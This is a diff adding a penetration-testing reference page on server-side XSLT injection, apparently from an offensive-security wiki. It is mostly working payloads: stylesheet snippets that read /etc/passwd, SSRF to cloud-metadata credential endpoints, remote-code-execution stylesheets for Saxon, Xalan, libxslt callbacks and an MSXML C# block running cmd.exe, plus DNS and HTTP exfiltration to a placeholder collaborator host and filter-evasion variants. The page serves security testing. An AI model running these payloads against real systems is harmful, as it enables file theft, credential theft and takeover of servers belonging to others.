@@ -1,0 +1,362 @@
+---
+title: XSLT Injection
+description: Server-side XSLT injection - XSLT 1.0 vs 2.0/3.0, processor fingerprinting (Xalan, Saxon, libxslt), file read, RCE via Saxon, and SSRF the parser.
+mitre: [T1190, T1059]
+d3fend: [D3-EAL, D3-NTA]
+impact: [ServerSideEval, FileRead, InternalAccess, RCE]
+sidebar:
+  order: 5
+  label: XSLT
+---
+import { Aside, Tabs, TabItem } from '@astrojs/starlight/components';
+
+## TL;DR
+
+XSLT is a programming language built into XML processors. An application that lets you supply or influence a stylesheet - common in PDF generators, report builders, SOAP servers, and document-conversion tools - is letting you execute XSLT. Depending on the processor, that ranges from "read internal files" to "full code execution" (Saxon-EE).
+
+```
+# Confirm XSLT eval
+<xsl:value-of select="7*7"/>                          <!-- → 49 -->
+
+# Fingerprint the processor
+<xsl:value-of select="system-property('xsl:vendor')"/>  <!-- Saxonica / Apache / libxslt -->
+<xsl:value-of select="system-property('xsl:version')"/> <!-- 1.0 / 2.0 / 3.0 -->
+
+# File read (XSLT 2.0+)
+<xsl:value-of select="unparsed-text('file:///etc/passwd')"/>
+
+# File read (libxslt - document() function)
+<xsl:value-of select="document('file:///etc/passwd')"/>
+
+# SSRF (any processor with HTTP-fetching enabled)
+<xsl:value-of select="document('http://<INTERNAL_HOST>/')"/>
+
+# RCE - Saxon-PE/EE only
+<xsl:value-of select="system-property('saxon:vendor')"/>     <!-- confirms Saxon -->
+<saxon:assign name="x" select="Runtime.getRuntime().exec('id')"/>  <!-- requires Saxon-PE+ -->
+```
+
+Success indicator: file contents, SSRF response, or shell output reflected in the rendered output. The processor type determines what's reachable.
+
+## Where this engine lives
+
+- **PDF / report generators** - many use XSL-FO (XSLT extension for paged output) via FOP, Antenna House, or RenderX. User-supplied XML + templated stylesheet is the typical sink.
+- **SOAP servers** - XSLT is commonly used inside WS-Security and WS-Policy enforcement. A SOAP endpoint that processes attacker-controlled XML may invoke XSLT internally.
+- **Document conversion services** - DOCX/XLSX import features that transform Office Open XML via XSLT.
+- **Legacy enterprise apps** - XML-driven application servers (BizTalk, TIBCO) lean on XSLT for transformations.
+- **Custom Java / .NET apps** - `javax.xml.transform.Transformer` (Java) and `System.Xml.Xsl.XslCompiledTransform` (.NET) are the standard APIs.
+
+## Step 1 - Confirm and orient
+
+XSLT runs inside an XML document; payloads are stylesheet snippets. The probe form depends on where your input lands:
+
+### Full stylesheet sink (you control the entire `<xsl:stylesheet>`)
+
+```xml
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <output>
+      <eval><xsl:value-of select="7*7"/></eval>
+    </output>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+If the rendered output contains `<eval>49</eval>`, you have full XSLT control.
+
+### Fragment sink (your input lands inside an existing stylesheet)
+
+```xml
+<xsl:value-of select="7*7"/>
+```
+
+If the output reflects `49` where your input was, the application is including your fragment in a working stylesheet.
+
+### Source XML sink (your input is the data being transformed, not the stylesheet)
+
+This is *not* XSLT injection - you control the XML the stylesheet reads, not the stylesheet itself. Look for XXE instead (separate vulnerability class).
+
+## Step 2 - Fingerprint the processor
+
+The XSLT spec has three major versions and four major implementations. What's reachable depends entirely on which one is running.
+
+```xml
+<xsl:value-of select="system-property('xsl:vendor')"/>
+<xsl:value-of select="system-property('xsl:version')"/>
+<xsl:value-of select="system-property('xsl:product-name')"/>
+<xsl:value-of select="system-property('xsl:product-version')"/>
+```
+
+Common outputs:
+
+| Vendor string | Processor | Common host |
+| --- | --- | --- |
+| `SAXON` / `Saxonica` | Saxon (HE/PE/EE) | Java / .NET - modern stack |
+| `Apache Software Foundation` | Xalan | Java - older Java stack |
+| `libxslt` | libxslt | PHP, Python, Ruby, C/C++ apps |
+| `Microsoft` | MSXML / XslCompiledTransform | Classic ASP / older .NET |
+| `Norman Walsh` | xsltproc (libxslt CLI) | Shell pipelines |
+
+`xsl:version` differences:
+
+- `1.0` - universal baseline. `document()` works; `unparsed-text()` doesn't. Most loot paths require `1.0` extensions.
+- `2.0` - adds `unparsed-text()`, `current-dateTime()`, much richer XPath 2.0 type system. Saxon-only on Java pre-2017; libxslt never gained 2.0.
+- `3.0` - adds streaming, packages, more. Saxon-only.
+
+The processor + version together determine what payloads work. See the per-processor sections below.
+
+## Step 3 - File read
+
+### `unparsed-text()` (XSLT 2.0+ - Saxon)
+
+```xml
+<xsl:value-of select="unparsed-text('file:///etc/passwd')"/>
+<xsl:value-of select="unparsed-text('file:///c:/windows/win.ini')"/>
+```
+
+Cleanest path on Saxon. Reads the file as a string and inserts into output.
+
+### `document()` (XSLT 1.0 - all processors)
+
+```xml
+<xsl:value-of select="document('file:///etc/passwd')"/>
+<xsl:copy-of select="document('file:///etc/passwd')"/>
+```
+
+`document()` is parsed as XML - if the file isn't well-formed XML, the result varies by processor:
+
+- **libxslt** - strict; non-XML files produce empty output
+- **Saxon** - strict; throws unless wrapped
+- **Xalan** - sometimes lenient; may return raw text
+
+To read non-XML files via `document()`, wrap the path in something that forces text mode (processor-specific - see below).
+
+### `php:function()` (libxslt with PHP - `libxslt-with-callbacks`)
+
+When the application calls `XSL\XSLTProcessor::registerPHPFunctions()`, PHP functions become callable from the stylesheet:
+
+```xml
+<xsl:value-of select="php:function('file_get_contents','file:///etc/passwd')"/>
+<xsl:value-of select="php:function('shell_exec','id')"/>
+```
+
+`registerPHPFunctions` is the single most dangerous XSLT configuration option. When enabled (intentionally or by carelessness), it converts XSLT injection directly into PHP RCE.
+
+### `EXSLT` extension functions
+
+EXSLT (a non-W3C extension library) adds file primitives in some processors:
+
+```xml
+xmlns:exsl="http://exslt.org/common"
+xmlns:str="http://exslt.org/strings"
+
+<xsl:value-of select="document('file:///etc/passwd')"/>
+```
+
+EXSLT is included in libxslt by default; Saxon supports a subset; Xalan supports another subset. Probe for which extensions work:
+
+```xml
+<xsl:value-of select="function-available('exsl:node-set')"/>          <!-- → true if EXSLT loaded -->
+<xsl:value-of select="function-available('document')"/>                <!-- universal -->
+<xsl:value-of select="function-available('unparsed-text')"/>          <!-- XSLT 2.0+ -->
+```
+
+## Step 4 - SSRF the parser
+
+`document()` accepts any URI scheme the underlying XML parser supports. On Java, that's `http://`, `https://`, `ftp://`, `jar://`, `netdoc:` and several others.
+
+```xml
+<xsl:value-of select="document('http://<INTERNAL_HOST>/')"/>
+<xsl:value-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
+<xsl:value-of select="document('http://<COLLAB>/xslt-confirm')"/>
+```
+
+Each of these makes the XSLT processor's host issue an HTTP request - full SSRF semantics. For cloud-metadata SSRF and internal-network discovery, the same techniques apply as in [SSRF](/codex/web/server-side/ssrf/) - XSLT injection is effectively another transport for the same attack class.
+
+### Java-specific schemes via `document()`
+
+```xml
+<xsl:value-of select="document('jar:http://<ATTACKER>/x.jar!/')"/>     <!-- JAR-from-URL -->
+<xsl:value-of select="document('netdoc:/etc/passwd')"/>                 <!-- alternate file scheme -->
+```
+
+`netdoc:` is a legacy Java URL scheme that resolves to local files on the JVM's filesystem. Useful when `file:///` is filtered specifically but XML URL handling isn't restricted.
+
+## Step 5 - RCE paths (processor-dependent)
+
+<Tabs>
+  <TabItem label="Saxon (PE / EE)">
+
+Saxon-PE and Saxon-EE expose Java reflection via the `saxon:` namespace and several extension functions. Saxon-HE (the free version) blocks these.
+
+```xml
+<xsl:stylesheet version="2.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:rt="http://saxon.sf.net/java-type?class=java.lang.Runtime"
+  xmlns:ob="http://saxon.sf.net/java-type?class=java.lang.Object">
+  <xsl:template match="/">
+    <output>
+      <xsl:value-of select="rt:exec(rt:getRuntime(), 'id')"/>
+    </output>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+The `saxon:` extension function bindings expose any Java class. The exact form depends on the Saxon edition and configuration but the `java-type?class=...` pattern is the standard entry.
+
+Saxon-EE also accepts inline Java via `<saxon:assign>` and similar - these are well-documented in Saxonica's manual and equally well-documented as SSTI vectors in older Saxon versions.
+
+  </TabItem>
+  <TabItem label="Xalan">
+
+Xalan (Java) supports extension functions in any Java class:
+
+```xml
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
+  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
+  <xsl:template match="/">
+    <output>
+      <xsl:variable name="runtime" select="rt:getRuntime()"/>
+      <xsl:variable name="process" select="rt:exec($runtime, 'id')"/>
+      <xsl:value-of select="$process"/>
+    </output>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+The `xalan/java/CLASSNAME` namespace pattern is Xalan-specific. Restricted in modern Java SE by the `javax.xml.transform.TransformerFactory.setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true)` flag - but plenty of older applications didn't enable it.
+
+  </TabItem>
+  <TabItem label="libxslt">
+
+libxslt itself doesn't have native RCE primitives. RCE requires the host language to have registered callbacks:
+
+```xml
+<!-- PHP - when registerPHPFunctions was called -->
+<xsl:value-of select="php:function('shell_exec','id')"/>
+
+<!-- Perl - when XML::LibXSLT's register_function was called -->
+<xsl:value-of select="perl:function('system','id')"/>
+
+<!-- Python - when lxml's set_default_resolver was configured -->
+<xsl:value-of select="py:function('os.system','id')"/>
+```
+
+Without those host-side registrations, libxslt's reach is limited to file read, SSRF, and entity-based attacks.
+
+  </TabItem>
+  <TabItem label="MSXML / .NET">
+
+MSXML / older .NET XslTransform supports script-block extension functions:
+
+```xml
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+  xmlns:user="http://example.com/user">
+
+  <msxsl:script language="C#" implements-prefix="user">
+    public string Run(string cmd) {
+      var p = new System.Diagnostics.Process();
+      p.StartInfo.FileName = "cmd.exe";
+      p.StartInfo.Arguments = "/c " + cmd;
+      p.StartInfo.UseShellExecute = false;
+      p.StartInfo.RedirectStandardOutput = true;
+      p.Start();
+      p.WaitForExit();
+      return p.StandardOutput.ReadToEnd();
+    }
+  </msxsl:script>
+
+  <xsl:template match="/">
+    <output><xsl:value-of select="user:Run('whoami')"/></output>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+Inline C# / JScript execution. Disabled by default in modern .NET (`XsltSettings.EnableScript = false`), but explicitly-enabled deployments still exist - particularly in legacy SharePoint and Dynamics installations.
+
+  </TabItem>
+</Tabs>
+
+## Step 6 - Blind & OOB exfiltration
+
+When output is suppressed or filtered, exfiltrate through side channels:
+
+### DNS exfiltration
+
+```xml
+<xsl:value-of select="document(concat('http://', encode-for-uri(unparsed-text('/etc/passwd')), '.<COLLAB>/'))"/>
+```
+
+The file's content becomes part of the DNS query for the OOB listener - limited to ~63 chars per label and ~255 chars per name, so practical only for small files or hashes.
+
+### HTTP exfiltration
+
+```xml
+<xsl:variable name="data" select="unparsed-text('/etc/passwd')"/>
+<xsl:value-of select="document(concat('http://<COLLAB>/exfil?d=', encode-for-uri($data)))"/>
+```
+
+Cleaner - files of any size go through. Bandwidth is limited by URL length on the wire, so chunk large files.
+
+### Time-based confirmation
+
+When no OOB and no reflection, fall back to timing:
+
+```xml
+<xsl:if test="contains(unparsed-text('/etc/passwd'), 'root')">
+  <xsl:value-of select="document('http://<COLLAB-SLOW-ENDPOINT>/')"/>
+</xsl:if>
+```
+
+Make the OOB endpoint slow (or just out-of-band itself) - a delay confirms the condition matched.
+
+## Step 7 - Filter-aware variants
+
+```
+# Namespace URI variations
+xmlns:rt="http://saxon.sf.net/java-type?class=java.lang.Runtime"
+xmlns:rt="http://saxon.sf.net/java-type?class=java\u002elang\u002eRuntime"
+
+# URL-encode parts of the URI
+xmlns:rt="http%3A//saxon.sf.net/java-type%3Fclass%3Djava.lang.Runtime"
+
+# Path through Class.forName
+<xsl:value-of select="java:java.lang.Class:forName('java.lang.Runtime')"/>
+
+# File path schemes
+file:///etc/passwd
+file://localhost/etc/passwd
+file:/etc/passwd
+file:////etc/passwd
+```
+
+XML processors are notoriously lenient about URI parsing - each processor has its own quirks worth testing when one form is filtered.
+
+## Detection-only payloads
+
+```xml
+<xsl:value-of select="7*7"/>                                          <!-- → 49 -->
+<xsl:value-of select="system-property('xsl:vendor')"/>                 <!-- vendor name -->
+<xsl:value-of select="system-property('xsl:version')"/>                <!-- 1.0/2.0/3.0 -->
+<xsl:value-of select="function-available('unparsed-text')"/>           <!-- → true on 2.0+ -->
+<xsl:value-of select="function-available('php:function')"/>            <!-- → true if libxslt+PHP -->
+```
+
+These are non-destructive and reveal what's reachable before you commit to an exploit chain.
+
+## Notes
+
+- **`secure-processing` feature** - Java's `TransformerFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` disables most extension functions. When enabled, the reflection paths above fail. Older deployments and explicitly-overridden ones still work.
+- **`disableExternalEntities` is XXE, not XSLT** - XXE and XSLT injection are distinct. XXE controls the *input XML*; XSLT injection controls the *stylesheet*. Some applications harden one but not the other.
+- **Saxon-HE is restricted by design.** Saxon's free edition (Home Edition) blocks Java reflection. Saxon-PE (Professional) and Saxon-EE (Enterprise) unlock it. The product version string identifies which edition.
+- **libxslt versions** - libxslt 1.1.30+ added stricter handling for `document()` and `<xsl:include>` resolving network URIs. Older libxslt versions reach external resources more freely.
+- **Empty output without error** - when a payload appears to succeed (no error) but returns nothing, the most likely cause is that `<xsl:value-of select="...">` is being applied to the wrong context node. Try `<xsl:copy-of>` instead, or wrap the expression with `<output>...</output>` to surround it in something whose absence is detectable.
+
+<Aside type="caution">
+XSLT injection in PDF generators is unusually high-value - the same vulnerability often combines file read (with `unparsed-text`), SSRF (with `document()`), and either RCE (with Saxon extensions or `registerPHPFunctions`) or, at minimum, exfiltration of every other tenant's PDFs in multi-tenant environments. Document the chain carefully; reproducing it later is harder than reproducing other SSRF/RCE classes because XSLT engines have many subtle configuration knobs.
+</Aside>
